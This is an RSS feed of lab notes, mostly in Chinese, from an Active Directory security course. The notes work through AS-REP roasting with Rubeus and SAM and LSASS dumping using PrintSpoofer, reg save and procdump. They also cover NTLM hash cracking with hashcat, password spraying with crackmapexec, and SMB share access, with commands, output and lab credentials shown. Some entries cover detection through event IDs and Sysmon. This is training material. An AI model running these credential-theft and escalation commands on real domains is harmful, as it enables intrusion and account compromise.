<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Information Security :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/information-security/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/information-security/index.xml" rel="self" type="application/rss+xml"/><item><title>NTUSTISC - AD Note - Lab(AS-REP Roasting)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/index.html</guid><description>NTUSTISC - AD Note - Lab(AS-REP Roasting) [TOC]
Lecture Video: 2022/05/11 AD 安全 2 Background 第十四章 Kerberos 認證系統
簡介：這是一種計算機網路授權協議，簡單說如果在同一個domain底下，想要存取某一個server的某項服務，則要如何驗證該使用者的身分以及授權他使用該項服務的資格?換個角度想，如果不認證會怎麼樣?首先，如果不認證使用者身分，就直接讓授權使用該項服務，則最直觀的攻擊就是DoS，或是駭客可以透過該項服務打到內網$\to$提權$\to$橫向移動$\to$APT，看起來很危險；另外一方面，如果有驗證身分，但通過驗證的人一率給予使用服務的授權，又會怎麼樣?可以利用eavesdropping得到授權的ticket再利用reply attack還是可以偽造身分 提醒：Windows Kerberos和MIT Kerberos在實作上有一點不一樣，如果想要知道windows kerberos可以看飛飛的文章12，然後自行比對粘添壽老師的影片 MIT Kerberos架構： 為了防止前面提到的問題，他增加了一個TGS的Server，但純控管tickets的發放，另外在驗證上面也增加了timestamp和請求方的網路位址，這樣就可以防止reply attack，而且短時間內都不需要再進行身分認證，很方便 Windows Kerberos架構： 優點 主密鑰分配：AS 伺服器除了必須擁有客戶的主密鑰之外，還必須擁有 TGS 的主密鑰；另外，TGS 伺服器也需要擁有所有伺服器的主密鑰。這就是 Kerberos 將所有參與者都稱為 Principal 的主要原因。 客戶密碼只要輸入一次：客戶端取得通往 TGS 的門票（TicketTGS）之後，在該票的有效期限之內，都可以請求服務，而不需要再輸入密碼來索取門票。 防禦偽裝攻擊：門票（TicketTGS與 TicketB）上有登錄該票的使用者識別（ID）、工作站位址（AD）、時間戳記（TS）與有效期間（Lifetime）。攻擊者攔截到門票之後，不易在在有效期內偽裝成合法客戶。 防止重播攻擊：門票有註明時間戳記（T），當攻擊者重播門票時，接收端可以利用時間戳記辨別門票的新舊。 Lab ==AS-REP Roasting== 攻擊情境：在Win2016的Server Manager中的Tools可以找到Active Directory User and Computer 在一般user的property中，可以看到Account/Account options最底下有一個選項==Do not require Kerberos preauthentication==，這個功能主要是前面提到的對於身分不會認證(1, 2步驟會略過，只執行3-6)，他只會認證後面的ticket 雖然預設是不勾選，但有兩種情況會打勾 如果被駭客打進去到最高管理員，當然它會勾選這個功能方便搞事(所有帳號) 因為windows有分版本，如果要向下兼容各版本之間的認證，則該選項就一定要勾選(這也是為甚麼講師在前面有提到一定要升級AD的舊環境)，這在很古老的系統中常常發生 滿足條件：只要前面提到的功能被打開，就可以進行AS-REP Roasting 如何攻擊： 自己把Microsoft的document看懂如何pack一個packet，然後自己實作 另一種方式就直接用工具Rubeus 1.6.4，他可以直接把有勾選該項目的帳號，送出AS-REQ的請求，然後接收AS-REP的回應，並把接收到的tickets以你指定的格式印出來 Cheat Sheet: $ Rubeus.exe asreproast $ Rubeus.exe asreproast /format:hashcat /outfile:out.txt 實際執行 Using Rubeus.exe :::spoiler Result $ Rubeus.exe asreproast ______ _ (_____ \ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \| ___ | | | |/___) | | \ \| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.6.4 [*] Action: AS-REP roasting [*] Target Domain : kuma.org [*] Searching path 'LDAP://WIN-818G5VCOLJO.kuma.org/DC=kuma,DC=org' for AS-REP roastable users [*] SamAccountName : reyna.gwendolyn [*] DistinguishedName : CN=Reyna Gwendolyn,CN=Users,DC=kuma,DC=org [*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128) [*] Building AS-REQ (w/o preauth) for: 'kuma.org\reyna.gwendolyn' [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$reyna.gwendolyn@kuma.org:4B08601B0A55BA231BED4333EAA6ED9C$E146006C2F6 B5EF8D78D4280E646FA601860D754261C28DC48470F2EA99E75DFD03E53F4BAC09BD1BE9697C5918 C48E5BA6A64D51A550FC6833327EBEF9A0C62F2448BA3CA3AA7D9BD375BF8BE693B1BC199A442053 AC3A40FA3F29EE3ABFB9B1B1E1C31DDD508FAB7971F1FDCE057D5A4481678511188DB99921762116 934D04C72071DAACFC6FFA8250380CD9ECECF95CC5702FD7A67AB90F18C299BB9AD8FF4A9325730E 859F2105F1AF64E170EB118111414CC44D0CDD1199860EF0D99ECD33FB618FEDCFAE96E0DFB75A4D 9EF3C06C99DBBD9C0A69A344C4C5A65B5B702152081F9 [*] SamAccountName : henrieta.sabine [*] DistinguishedName : CN=Henrieta Sabine,CN=Users,DC=kuma,DC=org [*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128) [*] Building AS-REQ (w/o preauth) for: 'kuma.org\henrieta.sabine' [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$henrieta.sabine@kuma.org:DEBC5F5111CE6D774625EB3DCC14925A$A91DD569550 A48219DAC0F53E4114DA7027E073DD6A86EFC83C79206787A84DBF6FC7F4B5168D7CBE65B073A05B B13AF1514D32D787948F91E05FF40191B6FE7819B9F5A978377D82B5E9532688B1CF28BBA1370365 68C110CAB41FEC26D262DC422CB54B678456470AE34F23B6D2CB1597E9565CACD11C1C5F9683408B 241650007B0E162C40D7694D8F5A5154254E0A54829C7784EB5493DF15812271C3161DD5937B368B 93406383215D909289E3FE096A10D396EF662C02031E6D4352C6A411EEC38B0A1D02A2E0AB03C86E CBF9C07C441C4D5EBD4269400373A2AFAD5879293B856 [*] SamAccountName : giulietta.moyra [*] DistinguishedName : CN=Giulietta Moyra,CN=Users,DC=kuma,DC=org [*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128) [*] Building AS-REQ (w/o preauth) for: 'kuma.org\giulietta.moyra' [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$giulietta.moyra@kuma.org:11CD5E39C2CEA9695C50826E6FCA66D3$9E2B2F3ED60 5D93BF02721F921D09DE188F1F7F3BE23907A73B95B30ECB0C1CFF5C68A0E814931A6A839DC1098C 2F3EF8B0A68492CA16E6CD96C843373581DD8CF14F7F58AE9B63A4717D1E8F7C2AA56DAC959F589C 1533249CA5BF72BBFC833609A0D958B7B5E692632D3557678B671E65C092494B38FC3840D09E16F4 1FE8D1BB86FAF16BD3F39E4E8CF8AC07A10FCD20E947D3A496A4204350D1E3B0448DB92AE749F3D0 7A9D1582677A5958B70DD38E2CDFC914C2848D0F9BC0E78D65AB7F3B9E1B5AFFA53588FBD7FFB297 357047776932B4EA2405ECB5705418BDE7CB8DBE725BB ::: 可以看到他總共吐出了三個hash，分別對應到三個使用者：reyna.gwendolyn, henrieta.sabine, henrieta.sabine，如果仔細對應win2016相對使用者的property會發現的確，這三個user的該選項都有打勾，現在則是利用hashcat之類的工具把hash暴力解開</description></item><item><title>NTUSTISC - AD Note - Lab(Brute Force SAM)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/index.html</guid><description>NTUSTISC - AD Note - Lab(Brute Force SAM) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 得到更高權限之後，會想要更多的密碼
密碼收集 SAM.hive(Security Account Manager) What: 就是一個用於windows的數據庫文件，用於==儲存用戶的密碼==，並且對於本地端或遠端的使用者進行身分認證 Where: C:\Windows\System32\config\SAM Password Spraying(用猜的) GPO 記憶體(lsass) Lab ==Brute Force SAM== 前面有提到SAM在哪裡，所以只要直接打開就看的到密碼了嗎?你會得到一個access denied的錯誤，原因是他已經被設定成read lock了，導致目前無法正常存取 匯出SAM File 主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取 $ reg save HKLM\SAM &lt;save filename> $ reg save HKLM\SYSTEM &lt;save filename> 錯誤的方式 但經過cmd用普通權限實測會發現我們沒有這樣的資格 $ reg save HKLM\SAM SAM.dump 錯誤: 用戶端沒有這項特殊權限。 其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file 正確的方式-1 用前面提到的web shell，打出以下指令，則SAM file就會dump到C:\inetpub\wwwroot\sam.zip $ c:\tools\PrintSpoofer64.exe -c "reg save HKLM\SAM C:\inetpub\wwwroot\sam" 正確的方式-2 利用Invoke-NinjaCopy.ps1這個腳本，就可以複製出來，原理是使用windows的影子複製 $ .\Invoke-NinjaCopy -Path SAM -LocalDestination C:\tools\SAM_COPY 但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤? :::info 如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊1解決問題 .\Invoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:\tools\Invoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID=135170。 位於 線路:1 字元:1 + .\Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestina ... + ~~~~~~~~~~~~~~~~~~ + CategoryInfo : SecurityError: (:) [], PSSecurityException + FullyQualifiedErrorId : UnauthorizedAccess ::: 解析SAM內容 拿到SAM的內容之後還需要解析他，可以用kali的samdump2解析 Win10 v1607之前的解法 $ samdump2 system sam Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: :1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 可以看到很多都是disabled，就代表我們要用下面的解法 Win10 v1607之後 因為這個版本之後有用到AES加密，所以可以用Creddump7，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事， $ conda activate py2.7 $ pip install pycrypto $ git clone https://github.com/CiscoCXSecurity/creddump7.git $ python pwdump.py system sam Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3180c5331aad6ad1ac787749e6c4819::: user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: low:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 解析Hash 方法一：用online database 接著就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如cmd5，如果把最前面找到的31d6cfe0d16ae931b73c59d7e0c089c0會顯示空密碼，但我們都知道是錯的 而如果拿Creddump解析出來的7ecffff0c3548187607a14bad0f88bb1，就可以直接顯示出我們的密碼 方法二：爆字典檔 在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看 $ sudo gunzip /usr/share/wordlists/rockyou.txt.gz $ cp /usr/share/wordlists/rockyou.txt ./ $ hashcat -a 0 -m 1000 ntlm.hash rockyou.txt --force ... 31d6cfe0d16ae931b73c59d7e0c089c0: 7ecffff0c3548187607a14bad0f88bb1:1qaz@WSX3edc ... Reference PowerShell 「系統上已停用指令碼執行」解決方法 ↩︎</description></item><item><title>NTUSTISC - AD Note - Lab(Hijack Token)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/index.html</guid><description>NTUSTISC - AD Note - Lab(Hijack Token) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 提權方法 利用弱點 Hijack Token Tools: PrintSpoofer Support: Windows 8.1/Server 2012 R2/10/Server 2019 How to use: $ PrintSpoofer.exe -c "command" Guess Password 管理服務 錯誤配置 Lab Time - 本地提權 ==Hijack Token(Network Service)== 這邊講師示範的是，如何利用IIS的特殊權限，達成提權。 先解釋一下，如果要使用PrintSpoofer之類的工具有個特殊的條件，就是需要有特殊權限，也就是 :::info
$ whoami /priv 需要有下列其一權限: SeImpersonatePrivilege => CreateProcessWithToken() SeAddignPrimaryToekn => CreateProcessAsUser() :::
whoami /priv 我們先看一下正常使用者的特殊權限有哪些
$ whoami /priv PRIVILEGES INFORMATION ---------------------- 特殊權限名稱 描述 狀況 ============================= ================== ====== SeShutdownPrivilege 關閉系統 已停用 SeChangeNotifyPrivilege 略過周遊檢查 已啟用 SeUndockPrivilege 從擴充座移除電腦 已停用 SeIncreaseWorkingSetPrivilege 增加處理程序工作組 已停用 SeTimeZonePrivilege 變更時區 已停用 可以看到上述的權限都沒有在這裏面，也就是說正常的使用者是不會有這兩個權限的，那誰會有這兩個權限呢?需要==impersonation(也就是講師說的切換身分)的人==，詳細的腳本可以看這邊1但今天不會用到，總之IIS就是一個需要做身分切換的角色，所以講師已經在Win10的電腦中設定好IIS，也起用了web shell的功能，我們就可以試看看，在browser中http://127.0.0.1/cmd.aspx，他可以直接用IIS的權限執行程式</description></item><item><title>NTUSTISC - AD Note - Lab(Leak Password)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/index.html</guid><description>NTUSTISC - AD Note - Lab(Leak Password) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 ==Lab - Leak Password from Description== 在Win2016的server manager當中，可以從Dashboard/Tools/Active Directory Users and Computers中看到整個網域使用者的部分資料，例如Name, Type和Description，而這個東西其實是所有整個網域使用者都看地到，所以==不可以把機敏資料寫在這裡例如帳密之類的==，就像下面截圖一樣，Fara Iseabal和Lina Allene的密碼都被leak出去了 當然，有加入網域的帳號也看的到，從Win10的網域帳號bear中，打開PowerShell :::spoiler Result
$ Get-ADUser -Filter * -Proper Description | Select-object Name,Description Name Description ---- ----------- Administrator Built-in account for administering the computer/domain Guest Built-in account for guest access to the computer/domain DefaultAccount A user account managed by the system. krbtgt Key Distribution Center Service Account Coraline Mahalia Gillian Marsiella Casi Hyacinth Mercy Edi Cyndie Rhodie Lucilia Lelah Fred Carmita Ortensia Fancy Seana Jeanette Logan Janeen Cassondra Lothario Ollie Dorita Gertrude Felecia Ella Randee New User ,DefaultPassword Anya Gypsy Ronni Kristoforo Maurizia Ines Reyna Gwendolyn Garnet Constancia Darlleen Dorisa Jessa Corinna Lorne Celie Bill Marylee Berna Raphaela Gabriel Diannne Shared User Caitrin Latia Selestina Cassi Carlye Chloette Dorrie Paolina Herminia Debby Rosetta Lotta Berny Kirby Moyra Fanechka Ranee Delinda Orelee Peri Shantee Marylin Annice Eden Stormie Natala Glenda Dorrie Laurena Mirelle Casandra Cherrita Lazaro Karoly Lina Allene User Password r2NE4/9:F;[k Kiri Kath Star Rikki Aloise Elfrida Shared User Marylynne Susannah Sherri Jacquetta Carey Kincaid Philippa Eugenie Dominica Carmon Eba Luca Martita Juanita Ruthie Ebony Charis Kory Bambi Etta Aleda Appolonia Shared User Randene Lelah Issy Eudora Margo Sharl Philis Gilli Reina Claire Corine Celesta Lon Sonni Joyann Sibella Katee Annemarie Henrieta Sabine Daile Odetta Marney Ranee Marlyn Loralee Fara Iseabal User Password 8F%kJ2q_cVFg Sofie Darlleen Jori Floria Replication Account Alikee Perri Karoly Nadeen Renae Babette Nolana Rivy Carmelle Libbi Sile Rhiamon Ruthann Britta Pietra Fern Amabelle Gayle Audi Rosalind Dollie Fayina Ricca Stefa Kaja Brenda Katharina Alyssa Angelique Hilda Linda Neda Shared User Jerrie Morganne Giulietta Moyra Erena Elinore Lily Kristofor Kizzee Margaux Christi Nettle Lilas Lindy Celeste Kelci Berget Celka Babb Joanne Andree Suki Bear Brown ::: 帳密一、Lina Allene$\to$r2NE4/9:F;[k 帳密二、Fara Iseabal$\to$8F%kJ2q_cVFg</description></item><item><title>NTUSTISC - AD Note - Lab(Password Spraying)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/index.html</guid><description>NTUSTISC - AD Note - Lab(Password Spraying) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) 和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來 Tool: CrackMapExec - 結合各種功能的內網滲透神器 GPO 記憶體(lsass) Lab ==Password Spraying== How to use?
Cheat Sheet $ crackmapexec &lt;protocol> &lt;target(s)> -u &lt;a file or string only> -p &lt;a file or string only> # For example $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd $ crackmapexec smb 10.10.10.100 -u ~/file_usernames -p ~/file_passwords $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd --local-auth $ crackmapexec smb &lt;filename> -u administrator -p Passw0rd --local-auth --local-auth代表是用本機帳號的角度登入，就不是用domain admin的角度登入 Recon Password Policy 在PowerShell中使用$ Get-ADDefaultDomainPasswordPolicy調查Domain上的密碼原則，Note: ==Win2016要打開==</description></item><item><title>NTUSTISC - AD Note - Lab(SMB遠端讀寫)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/index.html</guid><description>NTUSTISC - AD Note - Lab(SMB遠端讀寫) [TOC]
Lecture Video: 2022/05/11 AD 安全 2 Lab 這個lab主要和之前不太一樣的地方在於都是利用SMB的功能達到遠端電腦讀寫的效果，雖然遠端執行也可以做到，但這樣會比較方便
==遠端讀寫(w/ GUI)== Open File Explorer Enter \\&lt;IP>\c$ For example: \\192.168.222.128\c$ Login Local Admin Result 我在Win10中利用上述步驟，成功讀取到Win2016的資料 ==遠端讀寫(w/o GUI)== 沒有GUI的情況就需要先掛載遠端的C槽在本地端，然後才可以進行後續的讀寫，有時候他會跳出錯誤
Cheat Sheet $ net use \\&lt;IP>\C$ "&lt;password>" /user:&lt;username> :::spoiler Result $ net use \\192.168.222.128\C$ "1qaz@WSX3edc" /user:administrator # 掛載遠端磁碟 命令已經成功完成。 $ net use # 查看已掛載的遠端磁碟 會記錄新的網路連線。 狀態 本機 遠端 網路 ------------------------------------------------------------------------------- OK \\192.168.222.128\C$ Microsoft Windows Network 命令已經成功完成。 $ copy Rubeus.exe \\192.168.222.128\C$ 複製了 1 個檔案。 可以看到Win2016的C槽中多了一個Rubeus.exe的檔案，代表成功 ::: ==How to Detect SMB Access== Event ID: 5145 預設不開，因為會有大量的event湧入，除非設定有存取c$的filter，就會少非常多，因為遠端存取c槽本身就蠻可疑的，所以偵測到非法存取的機率就蠻高的</description></item><item><title>NTUSTISC - AD Note - Lab(偵測LSASS)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/index.html</guid><description>NTUSTISC - AD Note - Lab(偵測LSASS) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 得到更高權限之後，會想要更多的密碼
密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) GPO 記憶體(lsass) How to detect LSASS access? 利用Sysmon這個工具中有設定的event ID: 10，這個工具類似Event Viewer但更多元更強，下載可見Sysmon How to install? 簡單來說它需要先準備一個config file，然後安裝的時候就會一起把config設定好(每一間公司或每一個人都不一樣，算是機密) $ Sysmon64.exe -i sysmonconfig-export.xml Lab ==偵測LSASS== 利用Sysmon Event ID: 10
準備sysmonconfig 就像前面說的，每一間公司的sysmonconfig都是機密，所以我們這次的lab，講師也有準備簡易的sysmonconfig &lt;Sysmon schemaversion="4.1"> &lt;HashAlgorithm>SHA256&lt;/HashAlgorithm> &lt;EventFiltering> &lt;ProcessAccess default="include"> &lt;/ProcessAccess> &lt;/EventFiltering> &lt;/Sysmon> 安裝Sysmon 按照前面提到的指令，並把sysconfig準備好 $ Sysmon64.exe -i sysmonconfig-export.xml System Monitor v15.0 - System activity monitor By Mark Russinovich and Thomas Garnier Copyright (C) 2014-2023 Microsoft Corporation Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved. Sysinternals - www.sysinternals.com Loading configuration file with schema version 4.10 Sysmon schema version: 4.90 :::warning 實作中這邊遇到問題，理論上準備好sysmonconfig之後下command應該會安裝，但他只跑到一半就結束了，不確定是不是因為沒有連網還是其他設定沒有做好，總之，sysmon算是不能用了，所以之後還有其他的lab會用到就只能跳過 ::: Skip</description></item><item><title>NTUSTISC - AD Note - Lab(偵測密碼揮灑)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/index.html</guid><description>NTUSTISC - AD Note - Lab(偵測密碼揮灑) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 得到更高權限之後，會想要更多的密碼
密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) 和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來 Tool: CrackMapExec - 結合各種功能的內網滲透神器 GPO 記憶體(lsass) Lab ==Lab: How to detect Password Spraying== 利用Event ID: 4625, 4648, 4771的認證失敗紀錄 可以看到我是大約在4:52:08左右執行的，有一大堆的4625紀錄，如果抓最後一筆的紀錄，會顯示Account Name就是我們在Kali看到的最後一個帳戶，而且Keyword顯示Audit Failure</description></item><item><title>NTUSTISC - AD Note - Lab(偵測提權)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/index.html</guid><description>NTUSTISC - AD Note - Lab(偵測提權) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 提權方法 利用弱點 Hijack Token Guess Password 管理服務 錯誤配置 Lab Time - 本地提權 ==偵測Network Service提權== 利用Event ID: 4624
類型: 5 虛擬帳戶: 是 提高權限的權杖: 是 這樣的rule會有高機率命中，但經過實測會發現他不會顯示出類型5和虛擬帳戶為是的event，只有類型3會被顯示出來，如下圖</description></item><item><title>NTUSTISC - AD Note - Lab(偵測查詢的操作)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/index.html</guid><description>NTUSTISC - AD Note - Lab(偵測查詢的操作) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 ==Lab - How to observe they’ve audited the record?== 像前面說的，如果在群組的user要觀察ad的name, description之類的，要如何觀察到他們正在做的事情?可以利用==Windows Event ID: 4662==，這個event ID會針對所有user對LDAP的查詢進行log，這樣不管是誰進行查詢都會留下紀錄，但是事先要啟用(預設不開)
GPO(Group Policy Object)啟動相關事件稽核 在Win2016一開機會啟動Server Manager，其中的Tools/Group Policy Management 點選進去後在Forest:kuma.org/Domains/kuma.org/Default Domain Policy按右鍵選取Edit就會看到==Group Policy Management Editor== 接著在Group Policy Management Editor/Computer Configuration/Policies/Windows Settings/Security Settings/Local Policies/Audit Policy中可以找到==Audit directory service access Properties==，勾選起來就可以了</description></item><item><title>NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/index.html</guid><description>NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 有了Mimikatz也不一定能夠用，因為Windows的defender也知道這是個好用的東西，對於攻擊方而言，所以會盡可能的直接刪除，那要怎麼bypass或用其他方法把LSASS帶走?
Lab ==Take LSASS with other ways== 方法一 在windows工作管理員中，找到Local Security Authority Process(LSASS)，右鍵選==建立傾印檔案==，就可以直接dump memory，然後再把這一份檔案丟到自己可以開mimikatz的電腦，就可以分析了，會有一樣的效果 方法二 如果沒有GUI的話，也可以考慮直接使用Procdump，當然你必須要取得足夠的權限，要不就是用前面提到的IIS提權執行指令，不然就直接切換administrator帳戶，我是用前者 Command: c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c c:\tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp > c:\inetpub\wwwroot\tmp.txt" 可以看到它放在C:\Windows\system32\lsass.dmp中
透過Minidump獲取資訊 有了前面的lsass.dmp，就可以繼續使用mimikatz得到一些有用的資訊，只是，指令稍微有點不太一樣，因為我們不用對lsass進行debug
